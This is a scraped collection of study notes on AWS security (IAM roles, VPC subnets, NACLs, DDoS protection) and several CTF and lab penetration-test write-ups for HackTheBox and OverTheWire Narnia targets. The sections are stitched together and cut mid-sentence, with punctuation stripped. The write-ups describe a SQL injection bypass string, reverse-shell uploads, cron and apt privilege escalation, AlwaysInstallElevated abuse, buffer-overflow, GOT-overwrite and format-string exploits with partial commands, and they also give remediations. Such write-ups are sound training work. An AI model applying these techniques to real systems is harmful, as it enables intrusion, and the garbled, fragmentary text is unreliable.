methods to root accountGroups  groups are associated with set of permissions allowing members of that group to inherit those permissions   groups don t have credentials associated with it   object within IAMRoles  associated set of permissions that allows access to AWS resources   not associated with users or groups   sort of works like discord roles    Examples of roles      Service Roles  allows other AWS services to perform actions on one s behalf  only exist in account in which they were created  can t be used for cross account access   when using EC2 roles for deploying and running EC2 instances  it is best practice to associate EC2 instances with a role  removes the need to store credentials on any instance    role itself   instance profile    container for role    used to pass data to EC2 instance User Roles   when user assumes a role  their current permissions get temporarily replaced by the role s permissions Web Identity Federate Role   allows a single sign on  SSO  approach   federated access means user has been authenticated by external source     can be through well known identity providers  IDPs  such as Amazon  Google  or Facebook SAML 2 0 federated roles   allows creation of roles that have been federated through one s internal corporate directory    the external authentication system is one s own corporate directory of users    e g  Microsoft Active

different shared responsibility models 1  Infrastructure   most common model   covers infrastructure as a Service  IaaS  services such as Elastic Compute Cloud  EC2       Pasted image 20220131154703 png   AWS responsible for security of the cloud  customer is responsible for security in the cloud2  Container   customer does not have access to some of infrastructure level components such as the operating system   examples of services in container model  Elastic MapReduce  EMR   Relational Database Service  RDS   Elastic Beanstalk      Pasted image 20220131161816 png   AWS has more responsibilities with this model than the infrastructure model    platform and application management  operating system  and network configuration are responsibility of AWS3  Abstract      Pasted

Service  SQS   DynamoDB  and S3   accessed through endpoints    no access to operating system  infrastructure  or platform running these services  container   Configuring Infrastructure Security  AWS Contents  AWS Questions Configuring Infrastructure Security   Virtual Private Cloud  VPC   private section of AWS network  can be public faceSubnets   can only reside in a single availability zone  e g  only in eu west 1bAZ    each subnet should be configured for a specific use  i e  segmentation   this is security best practice    e g  subnet can contain only application servers  other subnet can contain only database servers  etc    falls within CIDR  classless inter domain routing  block of VPC    e g  if VPC CIDR block is  10 0 0 0 16   subnets can be the following  10 0 1 0 24   10 0 1 0    Network address  10 0 1 1    AWS routing  10 0 1 2    AWS DNS  10 0 1 3    AWS future use  10 0 1 255    Broadcast address 10 0 2 0 24  10 0 3 0 24 etc     note the first address is reserved for the network address  and the last address is reserved for the broadcast address    AWS reserves the first three host addresses in any subnetfirst host address reserved for internal AWS VPC routingsecond host address for AWS DNSthird host address for future use    therefore  251  out of 256  available host addresses for customer use in  16 subnetu Route Table  u   table subnet uses for routing traffic   if no route table is defined  default VPC route table is usedFlow Logs Tab   captures IP traffic sent between network interfaces of subnet   captured within CloudWatchInternet Gateway  IGW   helps create a public subnet  allows traffic to traverse from subnet in VPC to internet and vice versaNetwork Access Control Lists  NACLs   virtual network level firewalls  stateless  default NACL created when VPC is created   all traffic allowed by default  therefore default NACL is insecure   two fundamental components 1  Inbound Rules 2  Outbound Rules  final rule of NACL is that any traffic that isn t categorized by any of the rules gets dropped  rules read in ascending order until match is foundSecurity Groups  similar to NACLs  provide virtual firewall  except operates at instance level rather than network level  associated with instances rather than subnets  controls traffic to and from instances within VPC  stateful  no field for  Allow  or  Deny  traffic  as all rules in security group are assumed to be allowed  traffic not categorized as such is dropped    works as a whitelist for traffic  all rules evaluated before decision is madeBastion Hosts  used to gain access to instances that reside within private subnets  bastion host resides within public subnet  hardened EC2 instance with restrictive controls  acts as ingress gatewayu Public Subnet  u   a subnet associated with a route table pointing to an internet gateway  IGW  with a destination address of 0 0 0 0 0no packet is directly exchanged between internet and IPs inside private subnet  it goes first through the bastion hostNAT Instances and NAT Gateways  kind of like the opposite of bastion host  allows instances in private subnets to initiate a connection out to the internet via NAT resource  blocks all inbound public initiated traffic  allows private instances access to internet   usually used for maintenance related tasks such as updatesNAT Gateway   AWS managed resource   offers enhanced bandwidth and availability in comparison to NAT instance   requires far less administrative configuration than NAT instance  DDoS Protection   AWS Contents     AWS Questions DDoS Protection     protections include AWS Shield Advanced   3000 a month  and AWS Shield Standard  free     DDoS PatternsSYN Floods   abuses three way handshake when connection is being established between client and server    Pasted image 20220213185859 png     the final ACK completes the handshake  but this is dropped in SYN Flood attack to leave connection openHTTP Floods   many GET or POST requests sent to serverPing of Death  POD    oversized ping packets sent to target   maximum size of packet is 65 535 bytes  but with fragmentation you can send a lot of data to targetAWS Shield  specify ARN of resources and services Shield should protect  Elastic IP Address  EIP  should be specified first for EC2 instance in order to use Shield on it    AWS Shield Standard  free  helps protect against common DDoS attacks operating at network and transport layersAWS Shield Advanced    3000 per month   application traffic monitoring   monitors network  transport  and application layers   comes with AWS DDoS Response Team  known as DRT Rate Based Rules   counts number of requests received from IP address over 5 minutes   can define max number of request from singe IP within 5 minutes  must be over 2000 AWS CloudFront and Amazon Route 53   edge services    recommended to use these in conjunction with Shield to further decrease chances of compromise   helps detect DDoS attacks   allows for layer 3  4  and 7 attack mitigation  also 6 in the case of CloudFront used in conjunction with AWS WAF    Implementing Application Security   AWS Contents     AWS Questions Implementing Application Security  AWS WAFThree primary elements 1  Web ACL  Access Control List    contains rules and rule groups  defines what should be inspected within requests 2  Rules   defines specific criteria for what web ACL should be inspecting and what action to take  allow block count 3  Rule Groups   allows you to group a set of rulesAWS Firewall Manager   manages WAF rules across multi account environment when using AWS Organizations   uses WAF rules that are grouped together within a rule groupManaging Security Configuration of ELBs  ELB stands for Elastic Load Balancing   controls  manages  and distributes incoming requests to a specified resource group   can be internal or internet facing   internal ELBs only have private internal IP addresses and can only serve requests originating from within VPC   internet facing ELBs have public DNS names and have public and internal IP addresses    Types of ELBsThree different ELBs  u Application Load Balancer  u   supports incoming traffic for web applications running HTTP or HTTPS  allows routing of requests such as to different portsu Network Load Balancer  u   supports millions of incoming requests per second  ideal if low latency and high performance are prioritiesu Classic Load Balancer  u Using a Classic Load Balancer instead of an Application Load Balancer has the following benefits     Support for EC2 Classic    Support for TCP and SSL listeners    Support for sticky sessions using application generated cookiesSecuring APIs  AWS API gateway    Controlling Access to APIsMethods for controlling authentication and authorization      IAM Roles and Policies  using IAM  policies can be associated with user  role  or group to dictate permissions     IAM Tags  can be used in conjunction with IAM policies  used for references pertaining to security controls such as in the following example  a user being able to perform a specific action based on the resource tag      Resource Policies  attached to resources  unlike IAM which is attached to identity   specifies principal that has been granted or denied access to invoke associate API     VPC Endpoint Policies  also a resource based policy  but is a VPC endpoint   VPC endpoints allows access to AWS services using private IP addresses  controls access to private APIs  can be used in conjunction with API Gateway resource policies for additional security     Lambda Authorizers  uses AWS Lambda functions to restrict who can invoke REST API methods  can use bearer based tokens or HTML headers  paths  query string parameters  and

m32hn92j9nqqExecutive SummaryAfter enumerating the website  the  administrative page was found which involved a simple login page  The username field is vulnerable to a critical SQL injection  which an attacker could leverage to login as an administrative user  access sensitive local files  and extract usernames and password hashesFollowing the authentication bypass  an insecure image upload feature could be exploited to gain RCE on the target  After obtaining a shell as the www data user  escalating privileges to the local kyle user could be done by way of cracking his hash in the dev SQL database  The kyle user was part of the filter group which allowed for editing the configuration files of the SMTP service running locally on port 25  Because this service was running as the john user  getting a shell via the service resulted in compromising his accountFinally  the john user is part of the management group which has access to the apt repository configuration files  A cronjob running as root which performed a frequent apt get update command could therefore be taken advantage of  and obtaining root privileges was possible through adding a reverse shell file in the apt configurations  Please view the  Post Exploitation Analysis   h ui1gvqou6arf  and  Conclusion   h m32hn92j9nqq  sections to see remediations for these vulnerabilitiesAttack NarrativeNo information was

 especially since it cannot be found without brute forcing directories  Visiting this directory reveals a simple login form which asks for a username and password reports Writer image2 png Note the domain of the target  namely writer htb   However  no virtual host routing is presentSQL InjectionWhen inputting  OR 1 1     as the username and choosing a random value for the password  the user is automatically authenticated  thus confirming the presence of SQL injection  As an authenticated user  stories can be edited and created  and pictures can be uploaded reports Writer image5 png The web page does not properly check if an uploaded file is an image  as it was possible to upload a reverse shell by the name of php reverse shell jpg php  This  however  did not lead to RCE as the web page nevertheless treated the file as an image  Furthermore  uploading a malicious image with PHP code did not workAn addition to the image upload feature is the ability to upload files given a url  This

further detail about the vulnerabilities of the target and how to mitigate them  Note that the mitigations shown in this section are incomplete pieces of code  however they are secure implementations of the desired resultSQLi Mitigation  PDOThis machine contained multiple vulnerabilities  starting with the SQL injection in the  administrative page  The vulnerability lies in the following SQL statement that is performed on the user s queryhighlight sql  Select   From users Where username     s  And password     s      username  password    endhighlightThis insecure SQL statement allows an attacker to add a single quote in their username and then perform an arbitrary SQL statement of their choosing  To mitigate SQL injection attacks  the current recommendation is to use PDO  PHP Data Objects   The following code does not directly pass the user input into the SQL statement  Rather  using PDO tells the server what the SQL query and the user inputted data are  This is successfully performed because the instruction and user input are sent separately to the databasehighlight php   phptryconn   new PDO  mysql host  servername dbname  dbname    db username   db password      set

commands and evaluation functions should never be performed on user input  As discussed in  Finding RCE Vulnerability   h eswqky3qu6hx   the system   function in the os module was the reason for the critical RCE vulnerability  The following code prevents this vulnerabilityhighlight python from werkzeug utils import secure filenamefrom PIL import Imagefilename   request file  imageimage   StringIO base64 b64decode download  file    allowed extensions     jpg   jpeg  if filename split       1  in allowed extensions           try                 filename   secure filename filename            img

print  Invalid image     else             print  Filename extension not allowed       endhighlight   The above program verifies if a file is a valid image by first checking its extension  Note that this is different from the source code of the website which simply searches for the presence of the  jpg string in the filename  After verifying the file s extension  PIL s verify method is called on the file before the file is uploaded to the img directoryConclusionMultiple vulnerabilities were present on the target which resulted in a full compromise of the system  The  administrative page contained an SQL injection vulnerability which resulted in the leakage of local files and authentication bypass  After authenticating to the server  the insecure handling of filenames led to an RCE vulnerabilityAfterwards  the privilege escalation to root involved logging into the system as the kyle user who had permissions to edit the mail service  Due to the service running under john  the lateral movement involved adding a reverse shell to the configuration of the service  As the john user  apt configurations could be modified to exploit an apt get update cronjob running as the root user  Observe the following remediations to mitigate the vulnerabilities outlined in the reportSecure the SQL login page on  administrativePDO should be used in place of the insecure SQL statement  see  SQLi Mitigation  PDO    h nw8pksu8e5re   Never use system   or any sort of evaluation function on user input The system command on the uploaded filename resulted in RCE Never reuse passwordsAs the www data user  kyle s password could be retrieved by cracking his hash from the dev database  This would not have been of much use if the local kyle user had a different password on the target Passwords should be secure Fix misconfigurations related to the kyle and john userkyle was able to edit a service that was run by john  To mitigate this  the service should either be run by kyle  or kyle should not have permissions to edit the service john was able to edit apt configurations  This sort of privilege should not be granted to any user  By adding a reverse shell to the apt configurations  any user who runs the apt command can be compromised by john 1    ftnt ref1   https   github com OJ gobuster  https   www google com url q https   github com OJ gobuster sa D source

gets   function should never be used due to its lack of boundary checks on user input  This can result in the overwriting of memory that can lead to arbitrary code execution  ASLR and enabling the NX bit are not adequate in the prevention of binary exploitation  however they do help mitigate vulnerabilities   The following remediations should be strongly considered to prevent the attack outlined in this reportReplace the gets   function with fgets  The latter performs boundary checks on user input which mitigates buffer overflow attacksImplement PIEReturn to libc attacks worked by calculating the addresses of the system function and base libc address based on their known offersBy enabling PIE  the known offsets between executables cannot be predicted as they change with each new runtime processImplement  a stack canaryThe stack canary will mitigate buffer overflow attacks by protecting the return pointerPort 31568 should be closed immediately until the current binary is replaced with

of boundary checks in the login   function coupled with the improper usage of the libc scanf   function  consequently lead to the execution of the  bin cat system command upon passing a carefully constructed malicious string  Specifically  the second parameter of scanf   was not an integer pointer value as it was not prepended with an ampersand  Taking advantage of insecure code and the fact that the binary in question is dynamically linked  an attacker is capable of overwriting the GOT entry of printf   or fflush   to jump to any place in the binary s memoryAttack NarrativeThe source

three user created functions in total  main    welcome    and login    The main   function  however  is not of interest as it only calls printf   and the welcome   and login   functions  Looking at welcome    a buffer name 100  is initialized with 100 bytes  Afterwards  the scanf   function is called with  100s as the first argument  up to 100 bytes of data are passed into the aforementioned buffer and subsequently printed out when passed into printf    this behavior is examined in the  Taking Advantage of name 100    h 4ie0e0v86pcw  section   After welcome   is called  the login   function is executedTwo variables are initialized  int passcode1 and int passcode2  Following the initialization of these variables  scanf   d   passcode1  is called  but the second argument is not an integer pointer  as it is not prepended with the ampersand symbol   Next  fflush stdin  is called as opposed to fflush stdout   Incidentally  usage of the former is not recommended as it can invoke strange behavior due to it being undefined  The call to fflush   is meant for output streams only in which the buffered data is outputted to the console  1    ftnt1   The scanf   function is then called again in which the second argument is not prepended with the ampersand symbol  Lastly  an if statement is run which is true when passcode1 is equal to 338150 and passcode2 is equal to 13371337  On the condition that this is true  the flag located on the target system is read outExecuting BinaryExecuting the binary with the input of 338150 for passcode1 and 13371337 for passcode2 results in a

memoryTaking Advantage of name 100 Recall that welcome   only allocated 100 bytes to user input and implemented the scanf   function with the  s format specifier  The insecurity relating to this utilization of scanf   lies within the fact that it does not perform boundary checks on the user input  This unsafe practice results in a security hole in which user input can overflow the area in memory allocated for this buffer if the developer does not provide a safe value for the field width specifier  In the case of this binary  providing an input of larger than 100 bytes can result in the overflow of otherwise inaccessible memory located within login    This is because the field width specifier is 100   100s  and 100 bytes were allocated to the name buffer  Therefore  the trailing null byte will spill into memory located right after the buffer  To demonstrate this concept  observe the following1   First  the login   function is disassembled to find when the initial if statement

Fault   h thgrlc2mq99l    Therefore  in order to execute  bin cat  it is essential that the program is manipulated to point to an address after the if statement and before the call to the system

 it is important to realize what dynamic linking is and how it operatesUnderstanding Dynamic LinkingWhen a binary is dynamically linked  the libc calls within the program do not point to any meaningful addresses  Take the following snippet from passcode for examplehighlight bash 0x08048593   47      call   0x8048430  fflush plt 0x08048598   52      mov    eax 0x80487860x0804859d   57      mov    DWORD PTR  esp  eax0x080485a0   60      call   0x8048420  printf plt    endhighlightNote the text highlighted in red  The program calls fflush   and printf   which are at 0x8048430 and 0x8048420 respectively  Since this binary is dynamically linked  before the binary is ever run  fflush   and printf    and any other libc function for that matter  refer to placeholder addresses such as 0x00000000  However  once the program is loaded  these addresses are resolved using the help of the Global Offset Table  GOT  and Procedure Linkage Table  PLT   a table which converts position independent function calls to absolute locations  3    ftnt3   When a libc function is called  the first thing the PLT does is jump to the GOT  Global Offset Table  entry of the called function  The

the leakage of otherwise inaccessible data  Compiler warnings should never be ignored  Unsafe practices involving user input can lead to security holes  The scanf   function was improperly used  and is not recommended when dealing with strings  unless the developer is careful of the field width specifier and allocated buffer size   Furthermore  the second argument of scanf   was not prepended with the ampersand symbol  which allowed for the passing of an address causing the overwrite of printf    The following remediations should be strongly consideredPrepend scanf   with the amerpand symbol    Failure to do so allowed for the direct passing of an addressWhen dealing with strings  allocate at most a field width that is one less than the bufferDue to name 100  having 100 bytes  the scanf   field width specifier should be 99 instead of 100 to take into account the null byteUse sscanf   in conjunction with getline   when dealing with user inputted stringsgetline   automatically allocates an appropriate buffer size to safely fit the input string  5    ftnt5 The buffer of getline   can then be parsed with sscanf  The aforementioned remediations should be followed as soon as possible to prevent the attack described in this report  It is essential that the developer follow safe programming practices especially when dealing with user input1    ftnt ref1   https   www

1    ftnt1   for dynamic analysis  and Ghidra  2    ftnt2   for static analysis  are used throughout this reportGhidraMany different programs can be used for static analysis  however Ghidra  a tool created by the NSA  is utilized throughout this report because of its capability to translate assembly code into C code for easier analysis  Looking at the output of Ghidra  the following three functions are found reports You Know image2 png Within main   the string You know who are 0xDiablos  is printed out before the vuln   function is executed  This function allocates 180 bytes to the buffer local bc before the vulnerable gets   function is executed with local bc as the argument  The gets   function is a deprecated function within C due to its inability to perform boundary checks on the user input  The manual for the function states to  Never use this function   3    ftnt3The third function of the binary  namely flag    was not called by either main   or vuln    The flag   function checks if a file flag txt exists  If it does  then it performs an if statement in which it compares the param 1 and param 2 to certain hex values  On condition that this if statement is true  the contents of flag txt are read outGDB        Analysing this function through GDB helps in dissecting what the program is doing on the assembly levelhighlight bash 0x08049246   100     cmp    DWORD

endhighlightThe aforementioned if statement compares the value of the base pointer   8 to 0xdeadbeef and the base pointer   12 to 0xc0ded00d  Therefore  a successful exploit will constitute the control of the foregoing base pointer addresses along with the overwriting of the EIP register to point to the flag   functionConstructing ExploitEIP OffsetThe offset of the EIP register overwrite must first be determined  Within GDB  in order to provide an input to a program which prompts the user for a string  the desired string must first be echoed into a file  The contents of this file can then be run within the debugger  Hence  using the cyclic function  a pattern of 200 bytes was echoed into a file called eip overwrite as followshighlight bash    0xd4y Writeup     business hackthebox

boundary checks performed on user input  The deprecated gets   function was used within the binary despite the security warnings that are associated with it  As a result  memory could be overwritten resulting in behavior that the binary was not written to perform  The following remediations should be strongly consideredNever use the deprecated gets   functionUsage of this function creates the possibility for security risks that could allow malicious actors to run arbitrary codeUse the secure fgets   functionThis function reads user input until a newline character is found or until the buffer gets filledThe aforementioned remediations should be observed as soon as possible  Until this binary is patched  the service running on port 31449 should be disabled1    ftnt ref1   https   www

main purpose of this process of conversion is to save the state of an objectWhen untrusted user controlled data is saved into an object and an operation is performed on it  potential vulnerabilities could arise  Such is the case with the website discussed within this report  The PHPSESSID serialization cookie  provided upon accessing the website  was passed directly into an include statement  This resulted in a local file inclusion vulnerability  LFI  which was then upgraded to remote code execution  RCEAttack NarrativeOther than having been provided the source code for this challenge  no other information was given except for the IP of the box and the port on which the HTTP service sits  Despite having the source code  this challenge will be treated as if that information was not given so as to replicate real world black box environment engagementsWebsite AnalysisTo begin analyzing for vulnerabilities  the website will first be accessed reports Toxic image1 png After crawling through the website  nothing out of the ordinary was discovered  There was nothing on the website that looked for user input  so common web vulnerabilities related to XSS and SQL were unlikely to be

endhighlightAt the very bottom of the file  the function unserialize is performed on the argument  cookie  This would not result in a vulnerability if the cookie could not be modified by the client  However  this was not true for this challenge  and the web server could therefore be exploited   To fix this insecurity  the json  encode   and json  decode   should be implemented instead  Furthermore  input validation must be carried out on the cookie to ensure that it does not contain unexpected data  such as a different file nameAdditionally  the serialized object should be stored in a database with a unique identifier  The unique identifier would then be the value of the cookie  and its associated data could then be safely retrieved thus removing the ability of the client to modify the object s dataConclusionThe web server was vulnerable to a PHP Object Injection attack  This vulnerability can easily be avoided by practicing the secure methods outlined in the  Post Exploitation Analysis   h px1q03fgnzid  section  The following remediations should be immediately observed to ensure that sensitive local files do not get read by untrusted usersSecure the index php fileAs discussed in the previous section  the json  decode   and json  encode   functions should be used instead of the insecure unserialize   functionInsert object data into a database and use a unique identifierThe aforementioned remediations should be followed as soon as possible  as the system is currently prone to being penetrated by a malicious actor1     ftnt ref1   https   github com

interesting was found  Furthermore  attempts to perform a log injection   poisoning attack  2    ftnt2  were unsuccessful Looking back at the Nmap scan  a peculiar HTTP service running on port 5000 was found  However  this service could not be accessed due to the 403 Forbidden error  Nevertheless  due to this file scanner having the functionality of making GET requests  this page could indirectly be accessed through forcing the file scanner to make a request to this service reports Love image14 png After completing the request  credentials to a user by the name of admin are leaked  Piecing this information together with the  Admin Page   h 4wslswsfx98j  found during the HTTP enumeration  it follows that we can login as the administrator  Using the credentials of admin

From the output it can be seen that winPEAS detected a misconfiguration in the AlwaysInstallElevated group policy  By default  this policy is set to 0  and it is extremely dangerous to modify this value  When this policy is set to 1  Microsoft Windows Installer Packages  MSI  are installed with system privileges  Therefore  a malicious MSI file that returns a reverse shell can be used to get a

Exploitation AnalysisSQL InjectionThe SQL injection led to the leakage of the Admin password hash  This was due to the lack of user input sanitization  The following code snippet was taken from C xampphtdocsomrslogin php  and is running on the root page of http   10 10 10 239highlight php if isset   POST  login                 voter     POST  voter                                                   password     POST  passwordsql    SELECT   FROM voters WHERE voters id     voter                 query    conn  query  sql      endhighlight   This piece of code was responsible for the SQLi  Note the user query is passed directly into the sql variable  which is used during the connection to the internal SQL server  The user input is passed into the voter variable which is surrounded by single quotes in the SQL query  This was the reason for the SQLi working upon prepending a single quote to the beginning of the input  Note that this same vulnerability is present within C xampphtdocsomrsadminlogin phpBeta php VulnerabilityThe beta php file located at C xampphtdocsFFSbeta php was responsible for the initial foothold on the box  The code performs the curl function on the user query  but does not first check it for potentially malicious characters or stringshighlight php if isset   POST  read                                                     file trim   POST  file

curl close   curlendhighlightHardening this code will require a blacklist which should contain strings such as file  to prevent file      and localhostConclusionThis Windows system contained multiple vulnerabilities  The foothold on the machine started with an insecure file scanner feature located on the HTTPS server  The file scanner fails to sanitize user input  Thus  sensitive files located locally on the system could be read using the file     delimiter at the beginning of the query  Furthermore  sensitive services which are not able to be accessed by outside users  can be accessed by forcing the file scanner to perform a query on itselfA vulnerable version of Voting System software was installed which resulted in the ability to upload malicious PHP files to get a reverse shell  After obtaining a reverse shell  it was found that the box has a misconfiguration relating to the installation feature of Windows  and the enabled AlwaysInstallElevated group policy resulted in the privilege escalation to SYSTEM  The following remediations should be seriously consideredHarden SQL code in login phpSanitize user query  character escaping  blacklist characters  validate input Use stored procedures or parameterized queriesPerform sanitization on user query in the beta php fileUpdate Voting System softwarePoor validation within an image file upload feature resulted in the successful upload of malicious PHP to get a reverse shellModify AlwaysInstallElevated policyEnabling this group policy resulted in escalating privileges from a local account to SYSTEMThis policy should be changed from 1 to 01    ftnt ref1   https   github com OJ gobuster  https   www google com url q https   github com OJ gobuster sa D source editors ust 1653797783782138 usg

gs1ewfmvc73gExecutive SummaryThe attack performed on the target as outlined in this report was conducted without prior knowledge of anything about the client s machine except for its IP address  This was done so as to mimic a real attack from a person of malicious intent  The client s system contained multiple vulnerabilities ranging from local file inclusion to misconfigurations and an insecure SETUID binary  This machine was successfully compromised by exploiting an insecure PHP script to get a reverse shell as a low privileged user  after which we were able to horizontally escalate privileges to a user on the system who had access to a vulnerable SETUID running as root  After the exploitation of this binary  we were able to successfully gain full privileges as root on the Archangel system  The client is highly encouraged to patch the system with the remediations outlined in the  Conclusion   h gs1ewfmvc73g  sectionAttack NarrativeWe are given the IP of the target

proper permissions  or the archangel user may not have a private ssh keyAlthough we can include sensitive files on the vulnerable system  it is necessary to convert this LFI vulnerability to an RCE

endhighlightConclusionThe client is running a vulnerable http service that is at risk of being exploited  A malicious attacker can achieve full root access on this system without trouble  This system must be patched as soon as possible  and the following remediations will provide a stronger defense against possible attacksModify the test php script on the development site to not include user inputted filesThe script can be modified to only whitelist certain file namesFailure to correctly include files resulted in a critical RCE vulnerabilityBe mindful of misconfigurations within the local systemThe www data user was able to modify a critical cronjob run as the archangel user  which allowed for horizontal privilege escalationAlways use full paths when performing any action as a privileged userDue to the improper use of a command in a binary running as root  we were able to escalate privileges to the root user through modifying the PATH environment variableIt is highly encouraged that the system be patched as soon as possible with the aforementioned remediations1    ftnt ref1   https   outpost24 com blog from local file inclusion to remote code execution part 1

program was given  however throughout this report each program will be treated as if we are not given this information  This approach is taken so as to replicate real world environments in which an attacker most likely would not have knowledge on the source code of the binary he or she is trying to exploitThis penetration test resulted in the successful exploitation of all nine out of nine binaries  Among the vulnerabilities were the following  passing unsanitized input into functions  failure to check boundaries  using insecure functions  and unnecessarily disabling the NX bit

NarrativeEach binary gets increasingly harder  For every challenge  I have downloaded each binary by copying its base64 or base32 data on my attacking box  This was done to allow a further analysis into the binary by allowing the usage of pwndbg  1    ftnt1   Ghidra  2    ftnt2   and other tools that are not present on the target machineNarnia 0We are given the credentials for the narnia0 user

view what is inside the stack by accessing the ESP register  This register is responsible for pointing to the top of the stack  How the Buffer Relates to the StackThe buffer is where data is temporarily stored  and it is located in the RAM  random access memory  of the computer  When there is improper validation as to the content and size of the buffer  the program can experience an overflow in which inputted data floods the memory of the program reports Narnia image2 png   7    ftnt7  A visual image of how a buffer overflow attack can overwrite memoryAs more data gets inputted into the buffer  the stored data of the program  located in the stack  gets overwritten in the following order1   Local variables2   Saved registers3   Return address4   Function arguments  parameters reports Narnia image4 png   8    ftnt8  A simplified image on how the buffer relates to the stackWhen a program allocates a fixed number of bytes into the buffer  the memory of the buffer will end up spilling into the EBP  base pointer   ESP  stack pointer   and EIP  instruction pointer  registers  The EIP register will hold the return address  while the ESP register contains the data of the program  The EBP register is typically reserved as a backup for the ESP in case the ESP is modified during execution of a function  note that the EBP register can be overflowed as wellConstructing a PayloadNow with the knowledge of the EIP offset  132 bytes   we can construct a payload that will look like the followingJUNK BYTE   132   ADDRESS TO SHELLCODE   NOP SLED   SHELLCODEIn regards to the payload  it is important to emphasize what is the purpose of a NOP sled and what it is  A NOP sled is a series of NOP  no operation  bytes  which is an instruction that occupies space in memory  but tells the program to not do anything  The purpose of a NOP sled in binary exploitation is to allow a greater leniency when determining the proper address to flood the EIP register with  When the shellcode is put after the NOP sled and the instruction pointer is pointing to somewhere within the bounds of the NOP sled  the program will essentially go through each NOP instruction until it executes the shellcodeBinary Exploitation POCBefore the attack was conducted on the target machine  the payload was first executed on the attacking box so as to get a better view as to how to

Essentially  if a user was allowed to execute a binary with permissions of another user  then they could easily modify a program to execute what they would likeDebuggers have to execute the ptrace  process trace  function call to trace a function  this is how debugging programs work   This function prevents execve system calls from elevating privileges on the system  as the privilege elevations flags are ignored  effectively making the user have the same privileges as he or she did before debugging  The only way to execute an SUID binary with the permissions of the effective user  is to run the program as rootBinary AnalysisSeeing as reading the narnia4 s password in the memory of the stack pointer was not successful  we can analyze the binary in Ghidra to see how it works and come up

as local 5c and local 3c  The program checks if an argument is sent  If not it will provide the usage  otherwise it will perform the strcpy function  a function used to copy strings   This is a dangerous function which can result in buffer overflows  Reading the man page of this function and going to the  Bugs  section  the following description can be readIf the destination string of a strcpy   is not large enough  then anything might happen  Overflowing fixed length string buffers is a favorite cracker technique for taking complete control of the machine  Any time a program reads or copies data into a buffer  the program first needs to check that there s enough space  This may be unnecessary if you can show that overflow is impossible  but be careful  programs can get changed over time  in ways that may make the impossible possibleFollowing the strcpy function are two if statements  one for checking if a file exists  and another for checking if we have valid permissions for opening the file  If the file exists and we have permissions for opening the file  then the read and write functions are executedBefore figuring out how to exploit the binary  we should first understand how it behaves by doing what the program expectshighlight bash narnia3 narnia     narnia narnia3  etc narnia pass narnia4copied contents of  etc narnia pass narnia4 to a safer place      dev null    endhighlightThe program can read the narnia4 password file and copy it to  dev null  However  due to this being the place in linux used for discarding data  we cannot recover the passwordExploiting strcpyGoing back to Ghidra  we can see that the  dev null device is set to the variable local 1c reports Narnia image10 png If there is a buffer overflow vulnerability we can possibly overwrite this local variable  When inputting many strings followed by the word  test   we can see that the program returns an error for opening the program  however not all of the A s that we sent are outputtedhighlight bash narnia3 narnia     narnia narnia3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtesterror opening AAAAAAAAAAAAtest   endhighlightWe can try to create a file called AAAAAAAAAAAAtest and see how the binary respondshighlight bash narnia3 narnia  tmp  touch AAAAAAAAAAAAtestnarnia3 narnia  tmp  chmod 777 AAAAAAAAAAAAtestnarnia3 narnia  tmp   narnia narnia3

endhighlightStrangely  the binary now spits out all the A s that we inputted  Recall that we found within Ghidra that 32 bytes are being allocated to two unknown buffers  It is possible that one of the buffers is meant for the name of the input file  while the other buffer is meant for the output  This means that upon creating a long named directory and inputting the full path of a file located within this directory might successfully overwrite the variable allocated for the  dev null device  This methodology was carried out as followshighlight bash narnia3 narnia  tmp  mkdir   python  c  print  S  26  narnia3 narnia  tmp  cd   python  c  print  S  26  narnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSSS  touch testnarnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSSS  chmod 777 test   endhighlightNote that a directory of 26 S s was created because  tmp  is 5 characters and the   at the end of the S directory is one character  6   26   32 which is the size allocated for the bufferExecuting the full path of the  test  file within this directory proves to successfully overwrite the null device variablehighlight bash narnia3 narnia  tmp SSSSSSSSSSSSSSSSSSSSSSSSS   narnia

SSSSSSSSSSSSSSSSSSSSSSSSSS tmp   narnia narnia3  tmp SSSSSSSSSSSSSSSSSSSSSSSSSS tmp credentialserror opening tmp credentials   endhighlightThis error was included to further help in understanding how the binary worksThe error is missing a   at the beginning of the tmp directory  This is because  tmp  is four characters  S is 26 characters  and the trailing   is one character  which completely fills the 32 bytes allocated for the buffer   Therefore  the string after the trailing   of the S directory is what overwrites the variable for the null device  Creating a directory with 27 S s fixes this problem  note that the choice of S s was arbitrary  and any sequence of 27 bytes within the  tmp directory would have workedhighlight bash narnia3 narnia  tmp  mkdir   python  c  print  S  27

if statement  and within it  bin sh gets executed as the narnia6 user  However  due to the local c variable staying unchanged  the if statement is never run  From the code  we can deduce that there is a vulnerability in the following line  snprintf local 4c 0x40   char     param 2   4     This may be surprising  as the manual page for snprintf encourages its usageBUGS      Because sprintf   and vsprintf   assume an arbitrarily long string  callers must be careful not to overflow the actual space  this is often impossible to assure  Note that the length of the strings produced is locale de pendent and difficult to predict   Use snprintf   and vsnprintf   instead  or asprintf 3  and vasprintf 3   Code such as printf foo   often indicates a bug  since foo may contain a   character  If foo comes from un trusted user input  it may contain  n  causing the printf   call to write to memory and creating a security hole The security hole within this function lies in the fact that it uses a buffer of a fixed length with no boundary checks  11    ftnt11snprintf  is safe as you long as you provide the correct length for the buffer  snprintf does guarantee that the buffer won t be overwritten  but it does not guarantee null terminationFormat String ExploitTherefore  upon providing a format character such as  x  the function will spit out addresses from the stack POCnarnia5

contains 8 bytes  The methodology behind a format string attack is finding the address of a local variable that we would like to overwrite  this is given to us as 0xffffd5f0   After discovering the address of the targeted variable  we need to determine where the input gets stored in memory  After finding this information  we can finally overwrite the variable by providing its address followed by the  n format specifierProviding the input string of AAAA followed by the  x format specifier  we can immediately see the position of the input in the stackhighlight bash narnia5 narnia  narnia

of bytes inside the buffer corresponds to the overwriting value for the variable Controlling Variable ValueAfter verifying the ability for overwriting the local variable  we are left with the task of controlling its value  This can be done by padding the buffer using two different methods  Method 1We can use a specifier for the position of the input within the stackhighlight bash narnia5 narnia

within the stack  This method  however  is unstable in comparison to the second method  The payload used does not work when using single quotes around the input  rather only double quotes work  Method 2This method copies the address for the i variable twice before padding it with the necessary amount of bytes  Inputting the address twice was found to be necessary  after a lot of trial and

